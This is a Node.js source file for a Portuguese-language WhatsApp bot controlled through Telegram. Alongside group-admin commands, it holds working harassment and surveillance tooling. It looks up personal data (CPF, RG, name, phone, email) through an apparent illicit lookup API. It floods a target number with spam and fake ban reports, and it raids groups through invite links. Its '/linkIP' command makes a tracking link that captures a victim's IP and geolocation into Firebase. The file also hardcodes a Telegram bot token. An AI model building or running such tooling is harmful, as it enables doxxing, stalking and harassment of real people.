const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// Servidor HTTP básico exigido pelo Render para manter o serviço ativo 24h
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot ZRX Rodando 24 Horas!\n');
}).listen(PORT, () => {
    console.log(`Servidor HTTP rodando na porta ${PORT}`);
});

const TELEGRAM_TOKEN = '8622724732:AAFVKNCfcYIlZqfSGmnK23Urt1VAVy1kPHE';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

let waSock = null;
let jaNotificouConectado = false;
let reconectando = false;

function consultarAPI(url) {
    return new Promise((resolve) => {
        const req = https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); } catch (e) { resolve({ resultado: data }); }
            });
        });

        req.on('error', () => {
            resolve({ erro: "Falha na conexão com o servidor externo." });
        });

        req.setTimeout(8000, () => {
            req.destroy();
            resolve({ erro: "Tempo limite esgotado (Timeout)." });
        });
    });
}

function salvarFirebase(caminho, dados) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
        const dataStr = JSON.stringify(dados);

        const req = https.request({
            hostname: urlObj.hostname,
            path: urlObj.pathname,
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(dataStr)
            }
        }, (res) => {
            let resData = '';
            res.on('data', chunk => resData += chunk);
            res.on('end', () => resolve(resData));
        });

        req.on('error', err => reject(err));
        req.write(dataStr);
        req.end();
    });
}

function buscarFirebase(caminho) {
    return consultarAPI(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
}

async function iniciarWhatsApp(chatId, numeroTelefone) {
    if (reconectando) return;
    reconectando = true;

    const pastaSessao = path.join(__dirname, 'sessao_teste');
    const { state, saveCreds } = await useMultiFileAuthState(pastaSessao);

    waSock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    waSock.ev.on('creds.update', saveCreds);

    waSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const status = lastDisconnect?.error?.output?.statusCode;
            console.log(`Conexão fechada com status: ${status}`);
            jaNotificouConectado = false;

            if (status === DisconnectReason.loggedOut) {
                reconectando = false;
                if (chatId) bot.sendMessage(chatId, "⚠️ Desconectado do WhatsApp. Use `/limpar` e conecte novamente.");
                return;
            }

            setTimeout(() => {
                reconectando = false;
                iniciarWhatsApp(chatId, numeroTelefone);
            }, 5000);

        } else if (connection === 'open') {
            reconectando = false;
            console.log("WhatsApp conectado com sucesso!");
            
            if (chatId && !jaNotificouConectado) {
                jaNotificouConectado = true;
                bot.sendMessage(chatId, "✅ **Conectado com sucesso ao WhatsApp!**", { parse_mode: 'Markdown' });
            }
        }
    });

    waSock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0];
            if (!msg.message) return;

            const remoteJid = msg.key.remoteJid;
            
            // Trata texto normal ou legenda de imagem enviada junto ao comando
            const texto = msg.message.conversation || 
                          msg.message.extendedTextMessage?.text || 
                          msg.message.imageMessage?.caption || '';

            if (!texto) return;
            console.log(`Mensagem recebida de ${remoteJid}:${texto}`);

            if (texto.trim() === '/menu') {
                const numeroUsuario = remoteJid.split('@')[0];
                const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

                const menuTexto = 
                    `⛩️ *WHATSAPP BOT ZRX* ⛩️\n\n` +
                    `💬 *Suporte:* @Zenithzrx\n` +
                    `📱 *Número de usuário:* \`${numeroUsuario}\`\n` +
                    `⭐ *Status:* FREE USER\n` +
                    `🕒 *Online:* ${dataHoraAtual}\n\n` +
                    `┏━━━⧼𝑰𝑷 & 𝑳𝑰𝑵𝙆⧽\n` +
                    `> /ip <endereço>\n` +
                    `> /linkIP\n` +
                    `╠━━━⧼𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔𝗦 𝗗𝗔𝗗𝗢𝗦⧽\n` +
                    `> /cpf <cpf>\n` +
                    `> /nome <nome>\n` +
                    `> /consulrg <rg>\n` +
                    `> /telefone <telefone>\n` +
                    `> /email <e-mail>\n` +
                    `> /cep <cep>\n` +
                    `╠━━━⧼ATAQUES & AÇÕES⧽\n` +
                    `> /SP4M <número> <qtd>\n` +
                    `> /B4N <número> <qtd>\n` +
                    `> /B4NGRUPO <link>\n` +
                    `╠━━━⧼𝗚𝗘𝗦𝗧𝗔̃𝗢 𝗗𝗘 𝗚𝗥𝗨𝗣𝗢𝗦⧽\n` +
                    `> /kick <número>\n` +
                    `> /promover <número>\n` +
                    `> /rebaixar <número>\n` +
                    `> /tagall <mensagem>\n` +
                    `> /linkgrupo\n` +
                    `> /fechar\n` +
                    `> /abrir\n` +
                    `> /infogrupo\n` +
                    `> /mudar-nome <nome>\n` +
                    `> /mudar-desc <descrição>\n` +
                    `> /divulgar <texto | link>\n` +
                    `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
                
                const caminhoFoto = path.join(__dirname, 'menu.jpg');

                if (fs.existsSync(caminhoFoto)) {
                    await waSock.sendMessage(remoteJid, { 
                        image: fs.readFileSync(caminhoFoto), 
                        caption: menuTexto 
                    });
                } else {
                    await waSock.sendMessage(remoteJid, { text: menuTexto });
                }
            }
            else if (texto.startsWith('/ip ')) {
                const ipAlvo = texto.replace('/ip', '').trim();
                if (!ipAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/ip <endereço>`' });
                    return;
                }

                const dadosIp = await consultarAPI(`https://ipinfo.io/${ipAlvo}/json`);
                const respostaIp = 
                    `🌐 *RESULTADO IP* 🌐\n\n` +
                    `• *IP:* ${dadosIp.ip || 'N/A'}\n` +
                    `• *Cidade:* ${dadosIp.city || 'N/A'}\n` +
                    `• *Região:* ${dadosIp.region || 'N/A'}\n` +
                    `• *País:* ${dadosIp.country || 'N/A'}\n` +
                    `• *Provedor:* ${dadosIp.org || 'N/A'}`;

                await waSock.sendMessage(remoteJid, { text: respostaIp });
            }
            else if (texto.startsWith('/cpf ')) {
                const cpfAlvo = texto.replace('/cpf', '').trim();
                if (!cpfAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/cpf <número>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando CPF \`${cpfAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?cpf=${cpfAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO CPF:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/nome ')) {
                const nomeAlvo = encodeURIComponent(texto.replace('/nome', '').trim());
                if (!nomeAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/nome <nome>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando nome...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?nome=${nomeAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO NOME:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/consulrg ')) {
                const rgAlvo = texto.replace('/consulrg', '').trim();
                if (!rgAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/consulrg <rg>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando RG \`${rgAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?rg=${rgAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO RG:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/telefone ')) {
                const telAlvo = texto.replace('/telefone', '').trim();
                if (!telAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/telefone <número>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando Telefone \`${telAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?telefone=${telAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO TELEFONE:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/email ')) {
                const emailAlvo = texto.replace('/email', '').trim();
                if (!emailAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/email <e-mail>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando E-mail \`${emailAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?email=${emailAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO E-MAIL:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/cep ')) {
                const cepAlvo = texto.replace('/cep', '').trim();
                if (!cepAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/cep <cep>`' });
                    return;
                }
                await waSock.sendMessage(remoteJid, { text: `🔍 Consultando CEP \`${cepAlvo}\`...` });
                const resultado = await consultarAPI(`http://apisbrasilpro.site/telefone0.php?cep=${cepAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO CEP:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/SP4M ')) {
                const partes = texto.replace('/SP4M', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 10;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/SP4M <número> <quantidade>`' });
                    return;
                }

                let conteudoTrava = "⚡ [ZRX-SPAM] Alvo sob ataque!";
                const caminhoPayload = path.join(__dirname, 'Trava.txt');
                if (fs.existsSync(caminhoPayload)) {
                    const lido = fs.readFileSync(caminhoPayload, 'utf-8').trim();
                    if (lido.length > 0) conteudoTrava = lido;
                }

                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
                await waSock.sendMessage(remoteJid, { text: `🚀 Iniciando disparo SP4M para ${alvoNum} (${quantidade} ciclos)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await waSock.sendMessage(jidAlvo, { text: `${conteudoTrava}\n\n[Ciclo ${i}/${quantidade}]` });
                        await delay(1000);
                    } catch (err) {
                        console.log(`Erro no ciclo ${i}:`, err.message);
                    }
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Disparo SP4M para ${alvoNum} concluído com sucesso!` });
            }
            else if (texto.startsWith('/B4N ')) {
                const partes = texto.replace('/B4N', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 10;

                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4N <número> <quantidade>`' });
                    return;
                }

                await waSock.sendMessage(remoteJid, { text: `🛡️ Iniciando envios de denúncia/banimento para ${alvoNum} (${quantidade} ciclos)...` });

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        const payloadBan = `🚨 [ZRX-BAN REPORT #${i}/${quantidade}] 🚨\nNúmero denunciado por infração severa de termos de uso.`;
                        await waSock.sendMessage(`${alvoNum}@s.whatsapp.net`, { text: payloadBan });
                        await delay(800);
                    } catch (err) {
                        console.log(`Erro no reporte ${i}:`, err.message);
                    }
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias /B4N para ${alvoNum} finalizado!` });
            }
            else if (texto.startsWith('/B4NGRUPO ')) {
                const linkGrupo = texto.replace('/B4NGRUPO', '').trim();
                
                if (!linkGrupo || !linkGrupo.includes('chat.whatsapp.com')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/B4NGRUPO <link_do_convite>`' });
                    return;
                }

                const matchCode = linkGrupo.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
                if (!matchCode || !matchCode[1]) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Link de convite inválido!' });
                    return;
                }

                const codigoConvite = matchCode[1];
                await waSock.sendMessage(remoteJid, { text: `🔄 Tentando entrar no grupo via convite...` });

                try {
                    const idGrupo = await waSock.groupAcceptInvite(codigoConvite);
                    await waSock.sendMessage(remoteJid, { text: `✅ Entrou no grupo com sucesso! (\`${idGrupo}\`). Iniciando disparos...` });

                    for (let i = 1; i <= 15; i++) {
                        await waSock.sendMessage(idGrupo, { text: `🚨 [ZRX-GROUP ATTACK #${i}/15] 🚨\nGrupo sob invasão e derrubada!` });
                        await delay(1200);
                    }

                    await waSock.sendMessage(remoteJid, { text: `✅ Ataque ao grupo concluído!` });
                } catch (err) {
                    console.error("Erro ao atacar grupo:", err);
                    await waSock.sendMessage(remoteJid, { text: `❌ Erro ao interagir com o grupo: ${err.message || 'Verifique se o link é válido.'}` });
                }
            }
            else if (texto.startsWith('/kick ')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const alvoNum = texto.replace('/kick', '').trim().replace(/\D/g, '');
                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/kick <número>`' });
                    return;
                }
                try {
                    await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'remove');
                    await waSock.sendMessage(remoteJid, { text: `✅ O usuário \`${alvoNum}\` foi removido do grupo.` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao remover participante. Verifique se o bot é administrador.' });
                }
            }
            else if (texto.startsWith('/promover ')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const alvoNum = texto.replace('/promover', '').trim().replace(/\D/g, '');
                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/promover <número>`' });
                    return;
                }
                try {
                    await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'promote');
                    await waSock.sendMessage(remoteJid, { text: `✅ O usuário \`${alvoNum}\` agora é Administrador!` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao promover. Verifique se o bot é administrador.' });
                }
            }
            else if (texto.startsWith('/rebaixar ')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const alvoNum = texto.replace('/rebaixar', '').trim().replace(/\D/g, '');
                if (!alvoNum) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/rebaixar <número>`' });
                    return;
                }
                try {
                    await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'demote');
                    await waSock.sendMessage(remoteJid, { text: `✅ O usuário \`${alvoNum}\` foi rebaixado a membro comum.` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao rebaixar. Verifique se o bot é administrador.' });
                }
            }
            else if (texto.startsWith('/tagall')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const mensagemTag = texto.replace('/tagall', '').trim() || 'Atenção todos!';
                try {
                    const metadata = await waSock.groupMetadata(remoteJid);
                    const participantes = metadata.participants.map(p => p.id);
                    
                    let textoFinal = `📢 *TAGALL* 📢\n${mensagemTag}\n\n`;
                    for (let mem of participantes) {
                        textoFinal += `@${mem.split('@')[0]}\n`;
                    }

                    await waSock.sendMessage(remoteJid, { text: textoFinal, mentions: participantes });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao marcar os membros do grupo.' });
                }
            }
            else if (texto.trim() === '/linkgrupo') {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                try {
                    const codigo = await waSock.groupInviteCode(remoteJid);
                    await waSock.sendMessage(remoteJid, { text: `🔗 *Link de convite do grupo:*\nhttps://chat.whatsapp.com/${codigo}` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao obter o link. Verifique se o bot é administrador.' });
                }
            }
            else if (texto.trim() === '/fechar') {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                try {
                    await waSock.groupSettingUpdate(remoteJid, 'announcement');
                    await waSock.sendMessage(remoteJid, { text: '🔒 Grupo fechado! Apenas administradores podem enviar mensagens.' });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao fechar o grupo. Verifique se o bot é administrador.' });
                }
            }
            else if (texto.trim() === '/abrir') {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                try {
                    await waSock.groupSettingUpdate(remoteJid, 'not_announcement');
                    await waSock.sendMessage(remoteJid, { text: '🔓 Grupo aberto! Todos os membros podem enviar mensagens.' });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao abrir o grupo. Verifique se o bot é administrador.' });
                }
            }
            else if (texto.trim() === '/infogrupo') {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                try {
                    const meta = await waSock.groupMetadata(remoteJid);
                    const criador = meta.owner ? `@${meta.owner.split('@')[0]}` : 'Desconhecido';
                    const infoMsg = 
                        `📊 *INFORMAÇÕES DO GRUPO* 📊\n\n` +
                        `• *Nome:* ${meta.subject}\n` +
                        `• *Criador:* ${criador}\n` +
                        `• *Total de Membros:* ${meta.participants.length}\n` +
                        `• *Descrição:* ${meta.desc || 'Sem descrição'}`;
                    
                    const mencoes = meta.owner ? [meta.owner] : [];
                    await waSock.sendMessage(remoteJid, { text: infoMsg, mentions: mencoes });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao buscar informações do grupo.' });
                }
            }
            else if (texto.startsWith('/mudar-nome ')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const novoNome = texto.replace('/mudar-nome', '').trim();
                if (!novoNome) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/mudar-nome <novo nome>`' });
                    return;
                }
                try {
                    await waSock.groupUpdateSubject(remoteJid, novoNome);
                    await waSock.sendMessage(remoteJid, { text: `✅ Nome do grupo alterado para: *${novoNome}*` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao alterar nome. Verifique se o bot é administrador.' });
                }
            }
            else if (texto.startsWith('/mudar-desc ')) {
                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Este comando só pode ser usado dentro de grupos!' });
                    return;
                }
                const novaDesc = texto.replace('/mudar-desc', '').trim();
                if (!novaDesc) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/mudar-desc <nova descrição>`' });
                    return;
                }
                try {
                    await waSock.groupUpdateDescription(remoteJid, novaDesc);
                    await waSock.sendMessage(remoteJid, { text: `✅ Descrição do grupo alterada com sucesso!` });
                } catch (err) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Erro ao alterar descrição. Verifique se o bot é administrador.' });
                }
            }
            else if (texto.startsWith('/divulgar ')) {
                const conteudoDivulgacao = texto.replace('/divulgar', '').trim();
                if (!conteudoDivulgacao) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/divulgar <sua mensagem ou link>`\n*(Dica: Pode enviar junto com uma foto e colocar o comando na legenda!)*' });
                    return;
                }

                const mensagemFormatada = `📢 *DIVULGAÇÃO OFICIAL* 📢\n\n${conteudoDivulgacao}\n\n_Enviado via Bot ZRX_`;

                // Apaga a mensagem original de comando se possível para limpar o chat, e envia a divulgação formatada com imagem (se houver)
                try {
                    if (msg.message.imageMessage) {
                        // Se enviou com foto, baixa a imagem e reenvia com a nova legenda formatada
                        const streamToBuffer = async (stream) => {
                            const chunks = [];
                            for await (const chunk of stream) chunks.push(chunk);
                            return Buffer.concat(chunks);
                        };
                        const { downloadMediaMessage } = require('@whiskeysockets/baileys');
                        const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
                        
                        await waSock.sendMessage(remoteJid, { image: buffer, caption: mensagemFormatada });
                    } else {
                        await waSock.sendMessage(remoteJid, { text: mensagemFormatada });
                    }
                } catch (e) {
                    await waSock.sendMessage(remoteJid, { text: mensagemFormatada });
                }
            }
            else if (texto.trim() === '/linkIP') {
                const idUnico = 'zrx_' + Math.random().toString(36).substring(2, 8);
                const linkGerado = `https://wv0304362-bot.github.io/linkApi1-/?id=${idUnico}`;

                await salvarFirebase(`capturas/${idUnico}`, { status: 'aguardando', criado_em: new Date().toISOString() }).catch(() => {});

                await waSock.sendMessage(remoteJid, { 
                    text: `🔗 *LINK GERADO COM SUCESSO*\n\n` +
                          `Envie o link abaixo para o alvo:\n${linkGerado}\n\n` +
                          `_Assim que ele abrir e carregar, os dados cairão aqui!_` 
                });

                const intervaloVerificacao = setInterval(async () => {
                    try {
                        const dadosCapturados = await buscarFirebase(`capturas/${idUnico}`);
                        if (dadosCapturados && dadosCapturados.ip && dadosCapturados.ip !== 'Desconhecido' && dadosCapturados.timestamp) {
                            clearInterval(intervaloVerificacao);

                            const lat = dadosCapturados.location?.lat || 'Negado';
                            const lon = dadosCapturados.location?.lon || 'Negado';
                            const ipCapturado = dadosCapturados.ip || 'Desconhecido';

                            const alertaMsg = 
                                `🚨 *DADOS CAPTURADOS!* 🚨\n\n` +
                                `🌐 *IP:* ${ipCapturado}\n` +
                                `📍 *Latitude:* ${lat}\n` +
                                `📍 *Longitude:* ${lon}\n` +
                                `🕒 *Horário:* ${dadosCapturados.timestamp}`;

                            await waSock.sendMessage(remoteJid, { text: alertaMsg });
                        }
                    } catch (e) {}
                }, 3000);
            }
        } catch (erroMensagem) {
            console.error("Erro asset:", erroMensagem);
        }
    });

    if (!state.creds.registered && numeroTelefone) {
        await delay(3000);
        try {
            const codigo = await waSock.requestPairingCode(numeroTelefone);
            if (chatId) {
                const mensagemLayout = `✅ **Conectado com sucesso**\n\nO código\n\`${codigo}\``;
                const opts = {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[{ text: '📋 Copiar Código', callback_data: `copiar_${codigo}` }]]
                    }
                };
                bot.sendMessage(chatId, mensagemLayout, opts);
            }
        } catch (error) {
            if (chatId) bot.sendMessage(chatId, "❌ Erro ao gerar o código de pareamento.");
        }
    }
}

// Comando /foto no Telegram para definir a imagem do menu de ambas as plataformas
bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;
    const caption = msg.caption || '';

    if (caption.toLowerCase().startsWith('/foto') || msg.reply_to_message) {
        try {
            bot.sendMessage(chatId, "🔄 Salvando nova foto para o menu do bot...");

            const fotoId = msg.photo[msg.photo.length - 1].file_id;
            const fileLink = await bot.getFileLink(fotoId);

            const caminhoMenu = path.join(__dirname, 'menu.jpg');
            const fileStream = fs.createWriteStream(caminhoMenu);

            https.get(fileLink, (response) => {
                response.pipe(fileStream);
                fileStream.on('finish', () => {
                    fileStream.close();
                    bot.sendMessage(chatId, "✅ Foto do menu atualizada com sucesso! Agora ela aparecerá no WhatsApp e no Telegram.");
                });
            });
        } catch (err) {
            console.error("Erro ao salvar foto do menu:", err);
            bot.sendMessage(chatId, "❌ Erro ao salvar a foto.");
        }
    }
});

bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data;
    if (data.startsWith('copiar_')) {
        const codigo = data.replace('copiar_', '');
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: `Código ${codigo} copiado!`,
            show_alert: true
        });
    }
});

bot.onText(/\/limpar|\/desconectar/, async (msg) => {
    const chatId = msg.chat.id;
    const pastaSessao = path.join(__dirname, 'sessao_teste');

    try {
        if (waSock) {
            await waSock.logout().catch(() => {});
            waSock = null;
        }
        if (fs.existsSync(pastaSessao)) {
            fs.rmSync(pastaSessao, { recursive: true, force: true });
        }
        reconectando = false;
        jaNotificouConectado = false;
        bot.sendMessage(chatId, "🧹 Sessão limpa com sucesso! Use `/conectar SEU_NUMERO` para iniciar uma nova conexão.", { parse_mode: 'Markdown' });
    } catch (error) {
        bot.sendMessage(chatId, "❌ Erro ao tentar limpar os dados da sessão.");
    }
});

bot.onText(/\/conectar (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const numeroTelefone = match[1].replace(/\D/g, '');
    bot.sendMessage(chatId, `🔄 Solicitando código para o número: \`${numeroTelefone}\`...`, { parse_mode: 'Markdown' });
    await iniciarWhatsApp(chatId, numeroTelefone);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const startTexto = 
        `🤖 *ZRX CONTROL SYSTEM* \n\n` +
        `• Para conectar o WhatsApp: \`/conectar SEU_NUMERO\`\n` +
        `• Para atualizar a foto do menu: *Envie uma foto com a legenda \`/foto\`*\n` +
        `• Para limpar sessão: \`/limpar\``;

    const caminhoFoto = path.join(__dirname, 'menu.jpg');

    if (fs.existsSync(caminhoFoto)) {
        bot.sendPhoto(chatId, caminhoFoto, { caption: startTexto, parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(chatId, startTexto, { parse_mode: 'Markdown' });
    }
});

console.log("Bot do Telegram iniciado e escutando comandos!");
